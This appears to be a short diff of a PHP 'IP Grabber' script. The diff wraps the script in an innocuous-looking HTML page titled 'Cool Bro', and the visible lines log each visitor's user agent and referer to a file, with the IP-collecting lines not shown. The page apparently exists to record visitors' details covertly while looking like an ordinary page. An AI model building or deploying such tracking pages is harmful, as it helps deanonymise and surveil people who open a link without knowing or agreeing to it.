@@ -1,3 +1,8 @@
+<html>
+  <head>
+    <title> Cool Bro </title>
+  </head>
+  <body>
 <?php
  
 //IP Grabber
@@ -21,3 +26,5 @@ fwrite($fh, 'User Agent: '."".$agent ."\n");
 fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");
 fclose($fh);
 ?>
+ </body>
+</html>
